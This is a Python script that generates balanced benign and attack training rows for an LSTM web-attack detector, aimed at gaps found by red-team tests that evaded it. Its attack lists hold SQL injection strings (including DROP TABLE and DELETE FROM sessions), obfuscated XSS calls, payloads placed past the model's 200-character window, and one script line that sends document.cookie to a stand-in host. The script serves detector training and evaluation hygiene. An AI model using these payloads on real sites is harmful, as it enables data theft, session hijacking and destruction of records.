#!/usr/bin/env python3
"""
build_training_augmentation_v2.py

Second augmentation pass, adding EQUAL counts of new benign rows and new
attack rows, targeting the two concrete, measured gaps found by auditing the
corpus directly (not assumed):

  1. The training corpus's longest string is 131 characters -- NOTHING in
     it exceeds the LSTM's 200-character window, so the model never sees a
     "past-the-window" attack during training. Matches the documented
     evasion: 0/4 caught in the polymorphic red-team, 2/2 evaded in the
     Claude red-team (CLAUDE_EVASION_REDTEAM.md, POLYMORPHIC_REDTEAM.md).
  2. Low-symbol / semantic-phrasing attacks (SQLi and XSS expressed with few
     special characters) are essentially unrepresented (2 rows total).
     Matches: 0/10 semantic SQLi, 2/8 semantic XSS in the polymorphic
     red-team's aggressive tier.

Both classes get NEW attack rows here -- distinct wording from the existing
red-team probe texts, so training on this batch does not contaminate the
separate evaluation sets that measure whether it worked. Every attack
generator's output is checked against the red-team's own literal probe
strings (BANNED_EVAL_TEXTS below) and dropped on any exact match.

Matching benign rows are added in equal count, split between:
  - more short/medium symbol-heavy or prose benign text (keeps the FPR-side
    representation growing at the same rate as the attack side), and
  - long-form (>200 char) purely benign paragraphs with NO injected attack,
    using prefix styles similar to the past-window attacks but never an
    attack payload -- so the model sees that length alone, absent a payload,
    is not the signal. Without this, adding only long ATTACK rows would let
    "long text" itself become a spurious predictor of the attack class.

Idempotent: strips any previously-appended "aug2" rows before adding the
current batch (the original Improvement-Plan "aug" rows from
build_training_augmentation.py are left untouched).

USAGE (from dashboard/):  python scripts/build_training_augmentation_v2.py
"""
import ast
import csv
import json
import random
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from text_normalize import normalize_text  # noqa: E402

SEED = 20260915
random.seed(SEED)

ROOT = Path(__file__).parent.parent
LOG = ROOT / "data" / "honeypot_final.log"
HOLDOUT = ROOT / "data" / "eval" / "holdout_eval.csv"
SCRIPTS = ROOT / "scripts"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")

N_PER_CLASS_TARGET = 70   # x3 attack classes ~= 210; benign matched to the same total


# ── build the "never train on this" set: every literal string used by the ──
# ── separate red-team / significance eval scripts, so this augmentation   ──
# ── cannot contaminate the evaluations that will measure whether it helped ──
def _extract_block(path, start_marker, end_markers):
    lines = Path(path).read_text(encoding="utf-8").split("\n")
    started, block = False, []
    for line in lines:
        if not started:
            if start_marker in line:
                started = True
                block.append(line)
            continue
        if any(line.strip().startswith(m) for m in end_markers):
            break
        block.append(line)
    return "\n".join(block)


_STR_RE = re.compile(r'"([^"\\]|\\.)*"|' + r"'([^'\\]|\\.)*'")


def banned_eval_texts():
    banned = set()

    for fname in ["redteam_cases.json", "redteam_round2_cases.json"]:
        data = json.loads((SCRIPTS / fname).read_text())
        for row in data:
            if isinstance(row, list) and len(row) >= 3 and isinstance(row[2], str):
                banned.add(row[2])

    block23 = _extract_block(SCRIPTS / "23_claude_evasion_probe.py", "CASES = [", ["def "])
    for m in _STR_RE.finditer(block23):
        s = m.group(0)[1:-1]
        if len(s) > 4:
            banned.add(s)

    block24 = _extract_block(SCRIPTS / "24_polymorphic_probe.py", "BASE_ATTACKS = [", ["def ", "OPS ="])
    for m in _STR_RE.finditer(block24):
        s = m.group(0)[1:-1]
        if len(s) > 4:
            banned.add(s)

    # AGGRESSIVE tier (24_polymorphic_probe.py --aggressive): the exact
    # semantic_sqli / semantic_xss / past_window probe set this augmentation
    # is trying to help with, so it must not literally reproduce them.
    aggressive = {
        "semantic_sqli": [
            "1 or 1 between 1 and 1", "1 or 2 like 2", "1 or 'a' greatest 'a'",
            "give me all rows where the password is never checked",
            "return every account ignoring the login condition",
            "1 or 5000=5000", "1 or 0x41=0x41", "admin where true",
            "1 union all select null null from users",
            "select everything from the accounts table please",
        ],
        "semantic_xss": [
            "run a script that reads the cookie and sends it away",
            "make an image tag whose error handler pops an alert",
            "load javascript from an external site when the page opens",
            "String['fromCharCode'](60,115,99,114,105,112,116,62)",
            "top['ale'+'rt'](1)",
            "window['ev'+'al']('alert(1)')",
            "set an onmouseover handler that steals the session",
            "embed an iframe pointing at a javascript url",
        ],
        "past_window_prefix": [
            "Thank you for contacting support regarding your recent order. "
            "Our team has reviewed the details you provided and we appreciate "
            "your patience while we processed this request for you today. "
        ],
        "past_window_suffix": ["' OR '1'='1", "<script>alert(1)</script>",
                                "'; DROP TABLE users--", "<img src=x onerror=alert(1)>"],
    }
    for vals in aggressive.values():
        banned.update(vals)

    # also everything build_training_augmentation.py already generates (task 3/5
    # of the Improvement Plan) -- don't re-add duplicates of that batch either.
    import importlib.util
    spec = importlib.util.spec_from_file_location("aug1", SCRIPTS / "build_training_augmentation.py")
    aug1 = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(aug1)
    banned.update(aug1.benign_texts())
    aug1.INCLUDE_PLAIN_LANGUAGE_ATTACKS = True
    banned.update(aug1.attack_texts())

    return banned


# ── new ATTACK generators ────────────────────────────────────────────────
def semantic_sqli_texts():
    out = []
    verbs = ["fetch", "reveal", "expose", "surface", "pull up", "retrieve",
              "unlock", "hand over"]
    targets = ["the customer records", "every stored password", "the full user table",
               "all payment details", "the hidden admin account", "every session key",
               "the entire order history", "each user's private data",
               "the encrypted credentials", "the internal staff list"]
    conds = ["without checking the password", "by skipping the authentication step",
             "as if the login check never happened", "regardless of what credentials are given",
             "because the filter always evaluates true", "even though access should be denied",
             "so the where clause matches everything", "so every row qualifies no matter what"]
    combos = [(v, t, c) for v in verbs for t in targets for c in conds]
    random.shuffle(combos)
    for v, t, c in combos:
        out.append(f"{v} {t} {c}")

    numeric = []
    nums = [(7, 42), (9, 81), (3, 27), (5, 55), (2, 22), (6, 66), (4, 44), (8, 88)]
    ops = ["a boolean check that always passes: {a} or {b}={b}",
           "{a} or {b} between 1 and {b}",
           "id or {b} like {b}",
           "code or true equals true and {a} stays {a}",
           "pin or {a} in ({a},{b})",
           "flag or not (0={a})"]
    for a, b in nums:
        for tmpl in ops:
            numeric.append(tmpl.format(a=a, b=b))
    random.shuffle(numeric)
    out += numeric
    return out


def semantic_xss_texts():
    out = []
    actions = ["silently forward", "quietly transmit", "secretly copy",
               "automatically send", "covertly relay"]
    targets = ["the visitor's cookie", "the saved login token",
               "the browser's local storage", "the user's session id",
               "the autofilled password field"]
    mechanisms = ["through a hidden image tag", "using an invisible frame",
                  "via an auto-playing video element", "by way of a broken image handler",
                  "through a script injected into the page",
                  "using a redirect hidden in a link", "via a mistyped attribute the browser still runs"]
    combos = [(a, t, m) for a in actions for t in targets for m in mechanisms]
    random.shuffle(combos)
    for a, t, m in combos:
        out.append(f"{a} {t} {m}")

    computed_prop = [
        "self['al'+'ert'](2)", "parent['con'+'firm'](1)", "frames['pro'+'mpt']('x')",
        "globalThis['ale'+'rt'](3)", "this['al' + 'ert'](7)",
        "document['coo'+'kie']", "location['hr'+'ef']='javascript:alert(9)'",
    ]
    out += computed_prop
    return out


_PAST_WINDOW_PREFIXES = [
    "Per our records, the maintenance window for the billing subsystem has "
    "been rescheduled to avoid conflicting with the upcoming holiday freeze "
    "period, and all downstream consumers have been notified accordingly. ",
    "The quarterly compliance audit flagged three minor findings, all of "
    "which have since been remediated by the platform team ahead of the "
    "external reviewer's follow-up visit scheduled for next month, per the "
    "summary circulated to stakeholders on Monday. ",
    "Attendees at yesterday's planning session agreed to defer the schema "
    "migration until the read-replica lag issue is fully understood, given "
    "the risk of compounding the existing latency regression across the "
    "affected reporting pipelines. ",
    "This product ships with a two-year limited warranty covering defects "
    "in materials and workmanship under normal use, excluding damage from "
    "unauthorized modification or exposure to extreme operating conditions. ",
    "The incident postmortem noted that the alerting threshold had been set "
    "too conservatively, delaying the on-call page by roughly eleven "
    "minutes past the point where the error budget was first exhausted. ",
    "New hires should complete the onboarding checklist within their first "
    "week, including workstation setup, access provisioning, and the "
    "mandatory security-awareness training module assigned by IT before "
    "their second Friday on the team. ",
    "The vendor confirmed that the replacement part will ship within five "
    "business days, and a courtesy credit has been applied to the account "
    "for the inconvenience caused by the original shipping delay last "
    "month during the regional carrier disruption. ",
    "Release notes for this version include performance improvements to the "
    "search index, a fix for intermittent timeout errors under heavy load, "
    "and several minor accessibility improvements across the dashboard. ",
    "The onboarding survey results showed strong satisfaction with the new "
    "documentation portal, though several respondents asked for a clearer "
    "index of the API's rate-limiting behavior under burst traffic. ",
    "Regional distribution centers will observe adjusted pickup hours "
    "during the holiday period, and customers are encouraged to schedule "
    "returns early to avoid the seasonal processing backlog. ",
]

_PAST_WINDOW_SUFFIXES = [
    "' OR 'x'='x'--", "<svg onload=alert(2)>", "1; DELETE FROM sessions--",
    "<img src=y onerror=confirm(2)>", "' UNION SELECT null,null--",
    "<iframe src=javascript:alert(3)>", "admin'--", "<body onload=alert(4)>",
    "1' AND 1=1--", "<script>fetch('//evil.test/'+document.cookie)</script>",
    "' OR sleep(3)--", "<input autofocus onfocus=alert(5)>",
]


def past_window_texts():
    out = []
    combos = [(p, s) for p in _PAST_WINDOW_PREFIXES for s in _PAST_WINDOW_SUFFIXES]
    random.shuffle(combos)
    for prefix, suffix in combos:
        text = prefix + suffix
        # require the injection itself to start at/after char 200, i.e. the
        # LSTM's fixed 200-char window truncates before it ever sees the payload
        if len(prefix) >= 200 and len(text) > 200:
            out.append(text)
    return out


# ── new BENIGN generators (equal count to the attack side) ─────────────────
def benign_diverse_texts():
    out = []
    conds = ["retries < MAX_RETRIES", "response.status == 'ok'", "len(items) == 0",
             "user.is_active and user.verified", "balance - amount >= 0",
             "not cache.has(key)", "elapsed > TIMEOUT", "queue.isEmpty()"]
    bodies = ["break;", "return None", "await sync();", "logger.warn('retry')",
              "cache.evict(key);", "raise ValueError('bad state')"]
    for c in conds:
        for b in bodies:
            out.append(f"while ({c}) {{ {b} }}")

    prose = [
        "Invoice #{n} is due on the last business day of the month.",
        "Please forward the signed NDA to legal@company.example before Friday.",
        "The Q{n} roadmap review is scheduled for the first Tuesday of next month.",
        "Return shipments must include the original packing slip and RMA number.",
        "The API rate limit resets every 60 seconds per client key.",
        "Two-factor authentication is required for all admin-level accounts.",
        "The changelog notes a fix for the pagination off-by-one error.",
        "Support tickets older than 30 days are auto-archived nightly.",
    ]
    for tmpl in prose:
        for n in range(1, 6):
            out.append(tmpl.format(n=n) if "{n}" in tmpl else tmpl)

    symbolic = [
        "Total: $124.99 (incl. tax) -- free shipping over $50!",
        "Coordinates: 40.7128N, 74.0060W -- see map for details.",
        "Formula: E = mc^2, where c is about 3x10^8 m/s.",
        "Path: /usr/local/bin:/usr/bin:/bin -- check $PATH if not found.",
        "Version bump: 2.3.1 -> 2.4.0 (see CHANGELOG.md for breaking changes).",
        "Grade breakdown: A (90-100%), B (80-89%), C (70-79%).",
        "Ratio 16:9 vs 4:3 -- pick based on the target display.",
        "Discount: -15% applied at checkout; code SPRING15.",
    ]
    out += symbolic
    random.shuffle(out)
    return out


_LONGFORM_PREFIXES_ONLY = [
    "The customer success team compiled feedback from last quarter's survey "
    "and identified onboarding clarity as the top area for improvement, "
    "with several respondents requesting a shorter initial setup flow. ",
    "Facilities has confirmed that the west-wing conference rooms will be "
    "unavailable during the scheduled renovation, and bookings should be "
    "redirected to the north building until further notice is given. ",
    "The engineering handbook was updated this month to clarify the code "
    "review turnaround expectations, aiming for a first response within one "
    "business day for any pull request tagged as a hotfix. ",
    "According to the shipping carrier's tracking update, the package "
    "cleared customs yesterday afternoon and is now out for delivery, with "
    "an estimated arrival window sometime before the end of the week. ",
    "The finance team's month-end close checklist now includes an "
    "additional reconciliation step for foreign-currency transactions, "
    "following the audit recommendation from the external accounting firm. ",
    "Community guidelines were revised to add clearer examples of "
    "acceptable use, and moderators received updated training materials "
    "ahead of the policy taking effect at the start of next month. ",
    "The library's new digital catalog allows patrons to reserve items "
    "online and receive a pickup notification by email or text message "
    "once the requested title becomes available at their home branch. ",
    "Weather forecasters expect the current system to weaken as it moves "
    "inland overnight, with conditions gradually clearing by mid-morning "
    "and temperatures returning to seasonal norms by the weekend. ",
    "The museum's new exhibit on regional pottery traditions will run "
    "through the autumn, featuring pieces on loan from three neighboring "
    "institutions as part of a broader cultural exchange initiative. ",
    "Volunteers at Saturday's cleanup event collected several bags of "
    "litter along the riverbank trail, and organizers are already planning "
    "a follow-up event for later in the season given the strong turnout. ",
]


def benign_longform_texts():
    out = list(_LONGFORM_PREFIXES_ONLY)
    tails = [
        "No further action is required at this time.",
        "A summary will be shared once the review concludes.",
        "Please reach out with any questions in the meantime.",
        "Additional details are available in the linked document.",
        "This message is for informational purposes only.",
        "Further updates will follow as they become available.",
        "The next check-in is planned for the coming weeks.",
    ]
    combos = [p + t for p in _LONGFORM_PREFIXES_ONLY for t in tails]
    random.shuffle(combos)
    out += combos
    return [t for t in out if len(t) > 200]


def load_holdout_texts():
    if not HOLDOUT.exists():
        return set()
    with open(HOLDOUT, encoding="utf-8") as f:
        return {r["text"].strip() for r in csv.DictReader(f)}


def make_row(text, label, family, idx):
    return {
        "time": "2026-09-15T00:00:00Z",
        "source_ip": "10.0.0.2",
        "host": "app.local:443",
        "method": "POST",
        "uri": "/submit",
        "user_agent": UA,
        "request_body": text,
        "referer": "",
        "flow_uid": f"aug2_{idx}",
        "dup_index": 0,
        "session_id": f"aug2_sess_{idx}",
        "session_seq": 0,
        "label": label,
        "attack_family": family,
        "obfuscated": False,
        "synthetic_duplicate": False,
        "forced_unique_nonce": f"aug2_{idx}",
        "aug2": True,
    }


def main():
    banned_raw = banned_eval_texts()
    banned = {normalize_text(t) for t in banned_raw} | banned_raw
    holdout = {normalize_text(t) for t in load_holdout_texts()}

    # Exclude any PRIOR aug2 batch from the dedup set -- otherwise a re-run
    # sees its own previous output as "already present", generates nothing
    # new, then strips the old batch anyway, silently deleting it.
    existing_texts = set()
    with open(LOG, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            row = json.loads(line)
            if row.get("aug2"):
                continue
            uri = row.get("uri", "")
            body = row.get("request_body", "") or ""
            query = uri.split("?", 1)[1] if "?" in uri else ""
            existing_texts.add(f"{query} {body}".strip())
    existing_norm = {normalize_text(t) for t in existing_texts}

    def keep(seq):
        seen, out = set(), []
        for t in seq:
            t = t.strip()
            key = normalize_text(t)
            if (t and key not in seen and key not in holdout and key not in banned
                    and key not in existing_norm and t not in existing_texts):
                seen.add(key)
                out.append(t)
        return out

    attacks = {
        "semantic_sqli_aug": keep(semantic_sqli_texts()),
        "semantic_xss_aug": keep(semantic_xss_texts()),
        "past_window_aug": keep(past_window_texts()),
    }
    benign = {
        "benign": keep(benign_diverse_texts() + benign_longform_texts()),
    }

    n_per_attack_family = min(N_PER_CLASS_TARGET, *[len(v) for v in attacks.values()])
    total_attacks = n_per_attack_family * len(attacks)
    total_benign = min(total_attacks, len(benign["benign"]))
    # if benign has more available than needed, trim; if fewer, shrink attacks too
    # so the two sides stay EQUAL as requested.
    n_equal = min(total_attacks, total_benign)
    # re-derive an even per-family attack count that sums to n_equal
    per_fam = n_equal // len(attacks)
    remainder = n_equal - per_fam * len(attacks)

    final_attack_rows = []
    fam_names = list(attacks.keys())
    for i, fam in enumerate(fam_names):
        take = per_fam + (1 if i < remainder else 0)
        final_attack_rows += [(t, fam) for t in attacks[fam][:take]]

    final_benign_rows = [(t, "benign") for t in benign["benign"][:n_equal]]

    assert len(final_attack_rows) == len(final_benign_rows) == n_equal, \
        f"counts not equal: {len(final_attack_rows)} attacks vs {len(final_benign_rows)} benign"

    # strip any previous aug2 batch (idempotent)
    lines = LOG.read_text(encoding="utf-8").splitlines()
    kept = [ln for ln in lines if ln.strip() and not json.loads(ln).get("aug2")]
    removed = len(lines) - len(kept)

    idx = 0
    new_rows = []
    for t, fam in final_benign_rows:
        new_rows.append(make_row(t, 0, fam, idx)); idx += 1
    for t, fam in final_attack_rows:
        new_rows.append(make_row(t, 1, fam, idx)); idx += 1

    with open(LOG, "w", encoding="utf-8") as f:
        f.write("\n".join(kept))
        f.write("\n")
        for r in new_rows:
            f.write(json.dumps(r, ensure_ascii=False))
            f.write("\n")

    print("=" * 68)
    print("build_training_augmentation_v2.py -- equal benign/attack batch")
    print("=" * 68)
    print(f"  Removed old aug2 rows : {removed}")
    print(f"  New benign rows       : {len(final_benign_rows)}")
    print(f"  New attack rows       : {len(final_attack_rows)}  "
          f"({', '.join(f'{fam}={sum(1 for _,f in final_attack_rows if f==fam)}' for fam in fam_names)})")
    print(f"  Equal counts confirmed: {len(final_benign_rows) == len(final_attack_rows)}")
    print(f"  Log total now         : {len(kept) + len(new_rows)} rows")
    print("=" * 68)
    print("  Next: python scripts/18_train_stacked.py")
    print("=" * 68)


if __name__ == "__main__":
    main()
